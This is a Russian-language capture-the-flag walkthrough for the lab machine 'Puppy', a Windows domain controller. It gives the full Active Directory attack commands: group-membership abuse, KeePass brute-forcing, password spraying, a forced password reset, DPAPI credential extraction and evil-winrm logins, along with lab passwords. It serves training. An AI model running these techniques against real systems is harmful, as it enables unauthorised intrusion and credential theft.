# Puppy (2025)

<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

## Содержание:

В описании машины была предоставлена учетная запись `levi.james`. При сборе бладхаунда было обнаружено, что данная УЗ состоит в группе `HR`, которая имеет права `GenericWrite` на группу `DEVELOPERS`. После добавления пользователя в группу, шара `DEV` становится доступна для чтения. В ней был обнаружен файл `kdbx`, который был сбручен с помощью утилиты `keepass4brute`. Таким образом была получена УЗ `ant.edwards`. Она состоит в группе `SENIOR DEVS`, которая имеет права `GenericAll` на пользователя `ADAM.SILVER`. Данная УЗ была отключена, чтобы её включить использовался `ldap_shell`.  После подключения через `winrm` на диске `C:\` была обнаружена директория `Backups`, в которой содержался `zip`-архив. В нём был найден пароль от УЗ `steph.cooper`. У данного пользователя был зашифрованный `blob`-данных `DPAPI`. Расшифровав его локально, был получен доступ к УЗ `steph.cooper_adm`, которая состоит в группе `"Administrators"`.

## Разведка:

Сканирование портов:

```bash
nmap -sC -sV -p- 10.10.11.70 -oN nmap.out
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-11 06:42:29Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
57074/tcp open  msrpc         Microsoft Windows RPC
57106/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-11T06:44:23
|_  start_date: N/A
```

Внесение изменений в файл `/etc/hosts`:

```bash
10.10.11.70 DC PUPPY.HTB DC.PUPPY.HTB
```

В описании машины были даны  следующие данные `levi.james` / `KingofAkron2025!` их валидность можно проверить с помощью `nxc`:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
```

<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Также была обнаружена шара `DEV`. К ней на данный момент нет доступа:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares
```

<figure><img src="../../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

С помощью следующей команды можно собрать `bloodhound` для изучения структуры \`AD\`:

```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -dc DC.PUPPY.HTB -d PUPPY.HTB -ns 10.10.11.70 -c all
```

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

## Получение первоначального доступа (adam.silver)

В `bloodhound` можно обнаружить, что пользователь `levi.james` состоит в группе `HR@PUPPY.HTB`, которая имеет права `GenericWrite` на группу `Developers`:

<figure><img src="../../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

Таким образом, УЗ может добавить сама себя в эту группу:

```bash
net rpc group addmem "DEVELOPERS" "levi.james" -U "PUPPY.HTB"/"levi.james"%"KingofAkron2025!" -S "DC.PUPPY.HTB"
```

И после этого получить доступ к шаре `DEV`:

<figure><img src="../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

Подключиться к директории можно с помощью `impacket-smbclient`:

```bash
impacket-smbclient 'levi.james:KingofAkron2025!'@DC.PUPPY.HTB
```

<figure><img src="../../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

В ней был обнаружен файл `recovery.kdbx`. Сбрутить его с помощью `john` или `hashcat` не получится:

```bash
keepass2john recovery.kdbx > recovery.hash
```

<figure><img src="../../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

В качестве альтернативы можно использовать утилиту [keepass4brute](https://github.com/r3nt0n/keepass4brute):

```bash
git clone https://github.com/r3nt0n/keepass4brute
cd keepass4brute/
bash keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

Таким образом был получен пароль для файла `recovery.kdbx`. В нём содержатся названия УЗ и их пароли:

<figure><img src="../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Имена пользователей:

```
ADAM SILVER
ANTONY C. EDWARDS
JAMIE WILLIAMSON
SAMUEL BLAKE
STEVE TUCKER
```

Пароли пользователей:

```
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
```

Все юзернеймы `AD` и пароли можно проспрэить с помощью утилиты `nxc`:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --users | awk '{print $5}' > users.txt
```

<figure><img src="../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

```bash
nxc smb 10.10.11.70 -u users.txt -p passwords.txt --continue-on-success
```

<figure><img src="../../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

Так была получена УЗ `ant.edwards`. Она состоит в группе `Senior Devs`, которая имеет права `GenericAll` на пользователя `AD` `adam.silver`:

<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

С помощью `net rpc` пароль пользователя был изменён:

```bash
net rpc password "ADAM.SILVER" "newP@ssword20221"  -U "puppy.htb"/"ANT.EDWARDS"%"Antman2025!" -S "dc.puppy.htb"    

nxc smb 10.10.11.70 -u 'ADAM.SILVER' -p 'newP@ssword20221'
```

<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

Сама УЗ отключена в `Active Directory`. Её можно включить с помощью `ldap_shell`:

```bash
ldap_shell -dc-host dc.puppy.htb -dc-ip 10.10.11.70 'puppy.htb/ant.edwards:Antman2025!'

# enable_account adam.silver
```

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

А затем подключиться через `winrm`:

```bash
evil-winrm -i dc.puppy.htb -u 'ADAM.SILVER' -p 'newP@ssword20221'
```

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

## Повышение привилегий (steph.cooper)

После получения новой УЗ требуется снова собрать `bloodhound`:

```bash
bloodhound-python -u 'adam.silver' -p 'newP@ssword20221' -k -dc DC.PUPPY.HTB -d PUPPY.HTB -ns 10.10.11.70 -c all
```

<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

На диске `C:\` есть директория `Backups`, где лежит `zip`-архив:

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Его можно скачать с помощью команды `download` в `evil-winrm`:

```bash
unzip site-backup-2024-12-30.zip
grep -iR "pass" .
```

Далее обнаружить пароль:

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Также его проспрэить:

```bash
nxc smb 10.10.11.70 -u users.txt -p 'ChefSteph2025!'
```

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

Он подходит к пользователю `steph.cooper` и с помощью него можно подключиться по `winrm`:

```bash
evil-winrm -i dc.puppy.htb -u 'а' -p 'ChefSteph2025!'
```

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

## Повышение привилегий (steph.cooper\_adm)

В выводе `winpeas.exe` можно обнаружить, что у пользователя steph.cooper есть зашифрованный `DPAPI` `blob`-данных:

<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Тип логона через `winrm` `(Network, 3)` не позволяет работать с `DPAPI`. Для работы с `DPAPI` требуется тип логона, при котором создается интерактивный профиль пользователя и загружается мастер-ключ шифрования ( `Interactive` или `RemoteInteractive`).

Поэтому можно выкачать мастерключ и `blob`-данных к себе на машину и расшифровать данные локально:

```bash
cd C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\
ls -force
cp 556a2412-1275-4ccf-b721-e6a0b4f90407 C:\Users\steph.cooper\Documents\master_key
cd C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\
ls -force
cp C8D69EBE9A43E9DEBF6B5FBD48B521B9 C:\Users\steph.cooper\Documents\master_creds
```

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

При копировании файлы всё также остаются скрытыми:

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Чтобы их скачать, требуется выдать стандартные атрибуты файлов:

```powershell
Set-ItemProperty -Path "master_creds" -Name Attributes -Value ([System.IO.FileAttributes]::Normal)
Set-ItemProperty -Path "master_key" -Name Attributes -Value ([System.IO.FileAttributes]::Normal)
```

<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Затем можно расшифровать мастерключ и `blob`-данных:

```bash
impacket-dpapi masterkey -file ./master_key -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
impacket-dpapi credential -f master_creds -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Таким образом был получен новый пароль, который можно заспрэить:

```bash
nxc smb 10.10.11.70 -u users.txt -p 'FivethChipOnItsWay2025!'
```

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

Он подошел к УЗ `steph.cooper_adm`, которая входит в группу администраторов:

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

Далее можно подключиться через `winrm`:

```bash
evil-winrm -i 10.10.11.70 -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
```

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

И забрать флаг:

<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>













